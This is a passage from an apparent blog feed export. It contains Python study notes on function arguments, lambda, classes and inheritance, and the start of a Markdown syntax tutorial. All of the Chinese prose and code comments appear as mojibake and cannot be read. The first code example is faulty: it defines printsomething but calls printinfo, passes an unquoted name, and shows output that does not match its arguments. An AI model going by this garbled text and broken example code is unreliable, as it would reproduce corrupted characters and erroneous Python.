å‡½æ•°å([å¸¸è§„å‚æ•°], **vartuple):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printsomething</span>(<span class="params"> <span class="built_in">id</span>, **vardict </span>):</span><br><span class="line"><span class="comment"># æ‰“å°ä»»ä½•ä¼ å…¥çš„å‚æ•°</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;è¾“å‡º: &quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> (<span class="built_in">id</span>)</span><br><span class="line">   <span class="built_in">print</span> (vardict)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># è°ƒç”¨printsomethingå‡½æ•°</span></span><br><span class="line">printinfo(C1everF0x, age=<span class="number">19</span>,lever=<span class="string">&quot;å¼Ÿå¼Ÿ&quot;</span>)</span><br><span class="line"><span class="comment"># ç»“æœæ˜¯ï¼š</span></span><br><span class="line"><span class="comment"># è¾“å‡º: </span></span><br><span class="line"><span class="comment"># C1everF0x</span></span><br><span class="line"><span class="comment"># &#123;&#x27;age&#x27;: 19, &#x27;level&#x27;: &quot;å¼Ÿå¼Ÿ&quot;&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>å•ç‹¬ä¸€ä¸ªæ˜Ÿå·<code>*</code>ä¸å¸¦å‚æ•°ï¼Œè°ƒç”¨æ—¶å¿…é¡»ä¼ &#x3D;&#x3D;å…³é”®å­—&#x3D;&#x3D;è¿›å»</p><p>è¯­æ³•ä¸ºï¼šdef å‡½æ•°å([å¸¸è§„å‚æ•°], *):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">a,b,*,c</span>):</span><br><span class="line"><span class="keyword">return</span> a+b+c</span><br><span class="line">f(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)   <span class="comment"># æŠ¥é”™</span></span><br><span class="line">f(<span class="number">1</span>,<span class="number">2</span>,c=<span class="number">3</span>) <span class="comment"># æ­£å¸¸</span></span><br><span class="line"><span class="comment"># ç»“æœä¸º6</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="åŒ¿åå‡½æ•°"><a href="#åŒ¿åå‡½æ•°" class="headerlink" title="åŒ¿åå‡½æ•°"></a>åŒ¿åå‡½æ•°</h3><ul><li><p>ç”¨<code>lambda</code>æ¥åˆ›å»ºåŒ¿åå‡½æ•°</p></li><li><p>åˆ›å»ºå‡ºæ¥çš„å‡½æ•°åªæ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œä¸”ä¸èƒ½è®¿é—®è‡ªå·±å‚æ•°åˆ—è¡¨ä»¥å¤–çš„æˆ–å…¨å±€å‘½åç©ºé—´é‡Œé¢çš„å‚æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> å‚æ•°<span class="number">1</span>,å‚æ•°<span class="number">2</span>,...å‚æ•°N:è¡¨è¾¾å¼</span><br></pre></td></tr></table></figure></li></ul><h3 id="æ¨¡å—"><a href="#æ¨¡å—" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h3><ul><li>æ˜¯ä¸€ä¸ªåŒ…å«äº†æ‰€æœ‰è‡ªå®šä¹‰çš„å‡½æ•°å’Œå˜é‡çš„æ–‡ä»¶ï¼Œåç¼€åæ˜¯<code>.py</code>ï¼Œå¯ä»¥è¢«åˆ«çš„ç¨‹åºå¼•å…¥æ¥ä½¿ç”¨å…¶ä¸­çš„å‡½æ•°</li><li><code>dir()</code>å‡½æ•°å¯ä»¥çœ‹åˆ°æ¨¡å—å†…å®šä¹‰çš„æ‰€æœ‰åç§°</li></ul><h2 id="é¢å‘å¯¹è±¡"><a href="#é¢å‘å¯¹è±¡" class="headerlink" title="é¢å‘å¯¹è±¡"></a>é¢å‘å¯¹è±¡</h2><blockquote><p><strong><del>ä¼ä¸šçº§ç†è§£</del>ï¼š</strong></p><p><strong>é¢å‘å¯¹è±¡å°±æ˜¯è®©æ¯ä¸€ä¸ªç±»éƒ½åªåšä¸€ä»¶äº‹ï¼Œé¢å‘è¿‡ç¨‹å°±æ˜¯è®©ä¸€ä¸ªç±»è¶Šæ¥è¶Šå…¨èƒ½ï¼Œä¸€ä¸ªäººåšå®Œå…¨éƒ¨çš„äº‹æƒ…</strong></p><p><strong>æ‘‡(ç‹—å°¾å·´)â€”â€”é¢å‘è¿‡ç¨‹ç¼–ç¨‹</strong></p><p><strong>ç‹—.æ‘‡å°¾å·´()â€”â€”é¢å‘å¯¹è±¡ç¼–ç¨‹</strong></p><p><strong>æ‰¾ä¸€ä¸ªä¼šåšå®¶åŠ¡çš„ç”·æœ‹å‹ï¼Œå†æ‰¾ä¸€ä¸ªæœˆè–ª20kçš„ç”·æœ‹å‹ï¼Œå†æ‰¾ä¸€ä¸ªä¼šåšé¥­çš„ç”·æœ‹å‹ï¼Œæœ€åæ‰¾ä¸€ä¸ªè€å®ä¸èŠ±å¿ƒçš„ç”·æœ‹å‹ï¼Œä¸è¦è®©ä»–ä»¬å››ä¸ªäººåŒæ—¶è§é¢â€”â€”é¢å‘å¯¹è±¡ç¼–ç¨‹</strong></p><p><strong>æ‰¾ä¸€ä¸ªä¼šåšå®¶åŠ¡ã€æœˆè–ª20kã€ä¼šåšé¥­ã€è€å®ä¸èŠ±å¿ƒçš„è€å…¬â€”â€”é¢å‘è¿‡ç¨‹ç¼–ç¨‹</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¯­æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassName</span>:</span><br><span class="line">    æ–¹æ³•<span class="number">1</span>:</span><br><span class="line">        xxxxxx</span><br><span class="line">    æ–¹æ³•<span class="number">2</span>:</span><br><span class="line">        xxxxxx</span><br><span class="line">    å±æ€§<span class="number">1</span></span><br><span class="line">    å±æ€§<span class="number">2</span></span><br></pre></td></tr></table></figure><ul><li>ç±»çš„å¯¹è±¡å¯ä»¥å¼•ç”¨ç±»çš„å±æ€§å’Œæ–¹æ³•</li><li>ç±»çš„æ–¹æ³•ä¸æ™®é€šçš„å‡½æ•°åªæœ‰ä¸€ä¸ªç‰¹åˆ«çš„åŒºåˆ«â€”â€”å¿…é¡»æœ‰ä¸€ä¸ªé¢å¤–çš„<strong>ç¬¬ä¸€ä¸ªå‚æ•°åç§°</strong>, æŒ‰ç…§æƒ¯ä¾‹å®ƒçš„åç§°æ˜¯<code>self</code>ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–çš„åå­—</li></ul><h3 id="ç±»çš„æ–¹æ³•"><a href="#ç±»çš„æ–¹æ³•" class="headerlink" title="ç±»çš„æ–¹æ³•"></a>ç±»çš„æ–¹æ³•</h3><h4 id="ä¸€èˆ¬æ–¹æ³•"><a href="#ä¸€èˆ¬æ–¹æ³•" class="headerlink" title="ä¸€èˆ¬æ–¹æ³•"></a>ä¸€èˆ¬æ–¹æ³•</h4><p>åœ¨ç±»çš„å†…éƒ¨ï¼Œç”¨<code>def</code>å®šä¹‰æ–¹æ³•ï¼Œç±»çš„æ–¹æ³•å¿…é¡»åŒ…å«å‚æ•°<code>self</code>è€Œä¸”å¿…é¡»æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ<code>self</code>è¡¨ç¤ºçš„æ˜¯ç±»çš„å®ä¾‹ï¼ˆå¯¹è±¡ï¼‰</p><h4 id="é™æ€æ–¹æ³•"><a href="#é™æ€æ–¹æ³•" class="headerlink" title="é™æ€æ–¹æ³•"></a>é™æ€æ–¹æ³•</h4><p>ç”¨<code>@staticmethod</code>è£…é¥°ä¸å¸¦<code>self</code>å‚æ•°çš„æ–¹æ³•ï¼Œå¯ä»¥æ²¡æœ‰å‚æ•°ï¼Œå¯ä»¥ç›´æ¥ç”¨ç±»åæ¥è°ƒç”¨</p><h4 id="ç±»æ–¹æ³•"><a href="#ç±»æ–¹æ³•" class="headerlink" title="ç±»æ–¹æ³•"></a>ç±»æ–¹æ³•</h4><p>ç”¨<code>@classmethod</code>è£…é¥°ï¼Œé»˜è®¤æœ‰ä¸€ä¸ª<code>cls</code>å‚æ•°ï¼Œå¯ä»¥è¢«ç±»å’Œå¯¹è±¡è°ƒç”¨</p><h4 id="ä¸“æœ‰æ–¹æ³•"><a href="#ä¸“æœ‰æ–¹æ³•" class="headerlink" title="ä¸“æœ‰æ–¹æ³•"></a>ä¸“æœ‰æ–¹æ³•</h4><ul><li><code>__init__</code> æ„é€ å‡½æ•°ï¼Œåœ¨ç”Ÿæˆå¯¹è±¡æ—¶è°ƒç”¨</li><li><code>__del__</code> ææ„å‡½æ•°ï¼Œé‡Šæ”¾å¯¹è±¡æ—¶ä½¿ç”¨</li><li><code>__repr__</code> æ‰“å°ï¼Œè½¬æ¢</li><li><code>__str__</code>è¾“å‡ºå­—ç¬¦ä¸²</li><li><code>__setitem__</code>æŒ‰ç…§ç´¢å¼•èµ‹å€¼</li><li><code>__getitem__</code>æŒ‰ç…§ç´¢å¼•è·å–å€¼</li><li><code>__len__</code>è·å¾—é•¿åº¦</li><li><code>__cmp__</code>æ¯”è¾ƒè¿ç®—</li><li><code>__call__</code>å‡½æ•°è°ƒç”¨</li><li><code>__add__</code>åŠ è¿ç®—</li><li><code>__sub__</code>å‡è¿ç®—</li><li><code>__mul__</code>ä¹˜è¿ç®—</li><li><code>__truediv__</code>é™¤è¿ç®—</li><li><code>__mod__</code>æ±‚ä½™è¿ç®—</li><li><code>__pow__</code>ä¹˜æ–¹</li></ul><blockquote><p><strong>Python 3.7ç‰ˆæœ¬</strong></p></blockquote><h3 id="ç±»çš„å±æ€§"><a href="#ç±»çš„å±æ€§" class="headerlink" title="ç±»çš„å±æ€§"></a>ç±»çš„å±æ€§</h3><h4 id="å…¬æœ‰å±æ€§ï¼ˆåœ¨ç±»çš„å¤–éƒ¨å¯ä»¥ç›´æ¥è®¿é—®ï¼‰"><a href="#å…¬æœ‰å±æ€§ï¼ˆåœ¨ç±»çš„å¤–éƒ¨å¯ä»¥ç›´æ¥è®¿é—®ï¼‰" class="headerlink" title="å…¬æœ‰å±æ€§ï¼ˆåœ¨ç±»çš„å¤–éƒ¨å¯ä»¥ç›´æ¥è®¿é—®ï¼‰"></a>å…¬æœ‰å±æ€§ï¼ˆåœ¨ç±»çš„å¤–éƒ¨å¯ä»¥ç›´æ¥è®¿é—®ï¼‰</h4><p>è·Ÿå®šä¹‰å˜é‡ä¸€æ ·</p><p><code>a = 0</code></p><h4 id="ç§æœ‰å±æ€§ï¼ˆåœ¨ç±»çš„å¤–éƒ¨ä¸å¯ä»¥ç›´æ¥è®¿é—®ï¼‰"><a href="#ç§æœ‰å±æ€§ï¼ˆåœ¨ç±»çš„å¤–éƒ¨ä¸å¯ä»¥ç›´æ¥è®¿é—®ï¼‰" class="headerlink" title="ç§æœ‰å±æ€§ï¼ˆåœ¨ç±»çš„å¤–éƒ¨ä¸å¯ä»¥ç›´æ¥è®¿é—®ï¼‰"></a>ç§æœ‰å±æ€§ï¼ˆåœ¨ç±»çš„å¤–éƒ¨ä¸å¯ä»¥ç›´æ¥è®¿é—®ï¼‰</h4><p>å˜é‡åå­—å‰é¢åŠ ä¿©ä¸‹åˆ’çº¿</p><p><code>__a = 0</code></p><h3 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h3><h4 id="å•ç»§æ‰¿"><a href="#å•ç»§æ‰¿" class="headerlink" title="å•ç»§æ‰¿"></a>å•ç»§æ‰¿</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¯­æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">sonClassName</span>(<span class="title class_ inherited__">fatherClassName</span>):</span><br></pre></td></tr></table></figure><ul><li>ç›´æ¥è´´æ®µä»£ç ä¾‹å­</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç±»å®šä¹‰</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">people</span>:</span><br><span class="line">    <span class="comment">#å®šä¹‰åŸºæœ¬å±æ€§</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    age = <span class="number">0</span></span><br><span class="line">    <span class="comment">#å®šä¹‰ç§æœ‰å±æ€§,ç§æœ‰å±æ€§åœ¨ç±»å¤–éƒ¨æ— æ³•ç›´æ¥è¿›è¡Œè®¿é—®</span></span><br><span class="line">    __weight = <span class="number">0</span></span><br><span class="line">    <span class="comment">#å®šä¹‰æ„é€ æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n,a,w</span>):</span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line">        self.__weight = w</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s è¯´: æˆ‘ %d å²ã€‚&quot;</span> %(self.name,self.age))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#å•ç»§æ‰¿ç¤ºä¾‹</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">student</span>(<span class="title class_ inherited__">people</span>):</span><br><span class="line">    grade = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n,a,w,g</span>):</span><br><span class="line">        <span class="comment">#è°ƒç”¨çˆ¶ç±»çš„æ„å‡½</span></span><br><span class="line">        people.__init__(self,n,a,w)</span><br><span class="line">        self.grade = g</span><br><span class="line">    <span class="comment">#è¦†å†™çˆ¶ç±»çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s è¯´: æˆ‘ %d å²äº†ï¼Œæˆ‘åœ¨è¯» %d å¹´çº§&quot;</span>%(self.name,self.age,self.grade))</span><br><span class="line"> </span><br><span class="line">s = student(<span class="string">&#x27;C1everF0x&#x27;</span>,<span class="number">10</span>,<span class="number">60</span>,<span class="number">3</span>)</span><br><span class="line">s.speak()</span><br><span class="line"><span class="comment"># ç»“æœæ˜¯ï¼šC1everF0x è¯´: æˆ‘ 10 å²äº†ï¼Œæˆ‘åœ¨è¯» 3 å¹´çº§</span></span><br></pre></td></tr></table></figure><h4 id="å¤šç»§æ‰¿"><a href="#å¤šç»§æ‰¿" class="headerlink" title="å¤šç»§æ‰¿"></a>å¤šç»§æ‰¿</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¯­æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">sonClassName</span>(father1ClassName,father2ClassName)</span><br></pre></td></tr></table></figure><ul><li>ç›´æ¥è´´æ®µä»£ç ä¾‹å­</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç±»å®šä¹‰</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">people</span>:</span><br><span class="line">    <span class="comment">#å®šä¹‰åŸºæœ¬å±æ€§</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    age = <span class="number">0</span></span><br><span class="line">    <span class="comment">#å®šä¹‰ç§æœ‰å±æ€§,ç§æœ‰å±æ€§åœ¨ç±»å¤–éƒ¨æ— æ³•ç›´æ¥è¿›è¡Œè®¿é—®</span></span><br><span class="line">    __weight = <span class="number">0</span></span><br><span class="line">    <span class="comment">#å®šä¹‰æ„é€ æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n,a,w</span>):</span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line">        self.__weight = w</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s è¯´: æˆ‘ %d å²ã€‚&quot;</span> %(self.name,self.age))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#å•ç»§æ‰¿ç¤ºä¾‹</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">student</span>(<span class="title class_ inherited__">people</span>):</span><br><span class="line">    grade = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n,a,w,g</span>):</span><br><span class="line">        <span class="comment">#è°ƒç”¨çˆ¶ç±»çš„æ„å‡½</span></span><br><span class="line">        people.__init__(self,n,a,w)</span><br><span class="line">        self.grade = g</span><br><span class="line">    <span class="comment">#è¦†å†™çˆ¶ç±»çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s è¯´: æˆ‘ %d å²äº†ï¼Œæˆ‘åœ¨è¯» %d å¹´çº§&quot;</span>%(self.name,self.age,self.grade))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#å¦ä¸€ä¸ªç±»ï¼Œå¤šé‡ç»§æ‰¿ä¹‹å‰çš„å‡†å¤‡</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">speaker</span>():</span><br><span class="line">    topic = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n,t</span>):</span><br><span class="line">        self.name = n</span><br><span class="line">        self.topic = t</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æˆ‘å« %sï¼Œæˆ‘æ˜¯ä¸€ä¸ªæ¼”è¯´å®¶ï¼Œæˆ‘æ¼”è®²çš„ä¸»é¢˜æ˜¯ %s&quot;</span>%(self.name,self.topic))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#å¤šé‡ç»§æ‰¿</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">sample</span>(speaker,student):</span><br><span class="line">    a =<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n,a,w,g,t</span>):</span><br><span class="line">        student.__init__(self,n,a,w,g)</span><br><span class="line">        speaker.__init__(self,n,t)</span><br><span class="line"> </span><br><span class="line">test = sample(<span class="string">&quot;C1everF0x&quot;</span>,<span class="number">25</span>,<span class="number">80</span>,<span class="number">4</span>,<span class="string">&quot;Python&quot;</span>)</span><br><span class="line">test.speak()   <span class="comment">#æ–¹æ³•ååŒï¼Œé»˜è®¤è°ƒç”¨çš„æ˜¯åœ¨æ‹¬å·ä¸­æ’å‰çš„çˆ¶ç±»çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment"># ç»“æœæ˜¯ï¼šæˆ‘å« C1everF0xï¼Œæˆ‘æ˜¯ä¸€ä¸ªæ¼”è¯´å®¶ï¼Œæˆ‘æ¼”è®²çš„ä¸»é¢˜æ˜¯ Python</span></span><br></pre></td></tr></table></figure><h4 id="é‡å†™çˆ¶ç±»æ–¹æ³•"><a href="#é‡å†™çˆ¶ç±»æ–¹æ³•" class="headerlink" title="é‡å†™çˆ¶ç±»æ–¹æ³•"></a>é‡å†™çˆ¶ç±»æ–¹æ³•</h4><ul><li>å¯ä»¥åœ¨å­ç±»é‡Œé¢é‡å†™çˆ¶ç±»çš„æ–¹æ³•ï¼Œæ–¹æ³•åä¸€æ ·</li><li>è¦è°ƒç”¨çˆ¶ç±»è¢«è¦†ç›–çš„æ–¹æ³•çš„æ—¶å€™å¯ä»¥ä½¿ç”¨<code>super()</code>å‡½æ•°</li></ul>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdownè¯­æ³•</title>
      <link href="/posts/22648/"/>
      <url>/posts/22648/</url>
      
        <content type="html"><![CDATA[<h1 id="Markdownå¿«é€Ÿå…¥é—¨ï¼ˆtyproaï¼‰"><a href="#Markdownå¿«é€Ÿå…¥é—¨ï¼ˆtyproaï¼‰" class="headerlink" title="Markdownå¿«é€Ÿå…¥é—¨ï¼ˆtyproaï¼‰"></a>Markdownå¿«é€Ÿå…¥é—¨ï¼ˆtyproaï¼‰</h1><h2 id="0-å†…å®¹ç›®å½•"><a href="#0-å†…å®¹ç›®å½•" class="headerlink" title="0.å†…å®¹ç›®å½•"></a>0.å†…å®¹ç›®å½•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// å†…å®¹ç›®å½•è¯­æ³•</span><br><span class="line">[TOC]</span><br><span class="line">é€šå¸¸æ”¾åœ¨æ–‡æ¡£å¼€å¤´ï¼Œä»¥æ˜¾ç¤ºå…¨æ–‡å†…å®¹çš„ç›®å½•ç»“æ„</span><br></pre></td></tr></table></figure><p>[TOC]</p><h2 id="1-ä»£ç å—"><a href="#1-ä»£ç å—" class="headerlink" title="1.ä»£ç å—"></a>1.ä»£ç å—</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// ä»£ç å—è¯­æ³•</span><br><span class="line">â€‹```java</span><br><span class="line">ä¸‰ä¸ªé£˜å·ï¼Œåœ¨è‹±æ–‡çŠ¶æ€ä¸‹</span><br><span class="line">â€‹```shell</span><br><span class="line">// åŒ…è£¹ä»£ç è¯­æ³•</span><br><span class="line">`ä»£ç `</span><br></pre></td></tr></table></figure><p>Cè¯­è¨€ä¸­çš„<code>scanf_s</code>å’Œ<code>scanf</code>çš„åŒºåˆ«æ˜¯ä»€ä¹ˆå‘¢</p><h2 id="2-æ ‡é¢˜ï¼š"><a href="#2-æ ‡é¢˜ï¼š" class="headerlink" title="2.æ ‡é¢˜ï¼š"></a>2.æ ‡é¢˜ï¼š</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// æ ‡é¢˜è¯­æ³•</span><br><span class="line"># ä¸€çº§æ ‡é¢˜</span><br><span class="line">## äºŒçº§æ ‡é¢˜</span><br><span class="line">### ä¸‰çº§æ ‡é¢˜</span><br><span class="line">#### å››çº§æ ‡é¢˜</span><br><span class="line">##### äº”çº§æ ‡é¢˜</span><br><span class="line">###### å…­çº§æ ‡é¢˜</span><br></pre></td></tr></table></figure><h1 id="ä¸€çº§æ ‡é¢˜"><a href="#ä¸€çº§æ ‡é¢˜" class="headerlink" title="ä¸€çº§æ ‡é¢˜"></a>ä¸€çº§æ ‡é¢˜</h1><h2 id="äºŒçº§æ ‡é¢˜"><a href="#äºŒçº§æ ‡é¢˜" class="headerlink" title="äºŒçº§æ ‡é¢˜"></a>äºŒçº§æ ‡é¢˜</h2><h3 id="ä¸‰çº§æ ‡é¢˜"><a href="#ä¸‰çº§æ ‡é¢˜" class="headerlink" title="ä¸‰çº§æ ‡é¢˜"></a>ä¸‰çº§æ ‡é¢˜</h3><h4 id="å››çº§æ ‡é¢˜"><a href="#å››çº§æ ‡é¢˜" class="headerlink" title="å››çº§æ ‡é¢˜"></a>å››çº§æ ‡é¢˜</h4><h5 id="äº”çº§æ ‡é¢˜"><a href="#äº”çº§æ ‡é¢˜" class="headerlink" title="äº”çº§æ ‡é¢˜"></a>äº”çº§æ ‡é¢˜</h5><h6 id="å…­çº§æ ‡é¢˜"><a href="#å…­çº§æ ‡é¢˜" class="headerlink" title="å…­çº§æ ‡é¢˜"></a>å…­çº§æ ‡é¢˜</h6><h2 id="3-å­—ä½“"><a href="#3-å­—ä½“" class="headerlink" title="3.å­—ä½“"></a>3.å­—ä½“</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// åŠ ç²—</span><br><span class="line">**å¤ªé˜³ä¸æ˜¯ä¸€ä¸‹å­å°±ä¸‹å±±çš„**</span><br><span class="line">// ä»£ç é«˜äº®æ˜¾ç¤º</span><br><span class="line">==Hello World!==</span><br><span class="line">// åˆ é™¤çº¿</span><br><span class="line">~~æˆ‘æ˜¯å‚»é€¼~~</span><br><span class="line">// æ–œä½“</span><br><span class="line">*æˆ‘æ–œäº†*</span><br><span class="line">// æ–œä½“+åŠ ç²—</span><br><span class="line">***æˆ‘åˆæ–œåˆç²—***</span><br><span class="line">// ä¸Šæ ‡</span><br><span class="line">æˆ‘æ˜¯^ä¸Šæ ‡^</span><br><span class="line">// ä¸‹æ ‡</span><br><span class="line">æˆ‘æ˜¯~ä¸‹æ ‡~</span><br><span class="line">// ä¸‹åˆ’çº¿</span><br><span class="line">&lt;u&gt;ä¸‹åˆ’çº¿&lt;/u&gt;</span><br></pre></td></tr></table></figure><p><strong>å¤ªé˜³ä¸æ˜¯ä¸€ä¸‹å­å°±ä¸‹å±±çš„</strong></p><p>&#x3D;&#x3D;Hello World!&#x3D;&#x3D;</p><p><del>æˆ‘æ˜¯å‚»é€¼</del></p><p><em>æˆ‘æ–œäº†</em></p><p><em><strong>æˆ‘åˆæ–œåˆç²—</strong></em></p><p>æˆ‘æ˜¯^ä¸Šæ ‡^</p><p>æˆ‘æ˜¯<del>ä¸‹æ ‡</del></p><p><u>è¿™å°±æ˜¯ä¸‹åˆ’çº¿å—</u></p><h2 id="4-å¼•ç”¨ï¼š"><a href="#4-å¼•ç”¨ï¼š" class="headerlink" title="4.å¼•ç”¨ï¼š"></a>4.å¼•ç”¨ï¼š</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// å¼•ç”¨è¯­æ³•</span><br><span class="line">&gt; ä½œè€…ï¼šC1everF0x</span><br><span class="line">&gt;&gt; ä½œè€…ï¼šOui0jr</span><br><span class="line">&gt;&gt;&gt; 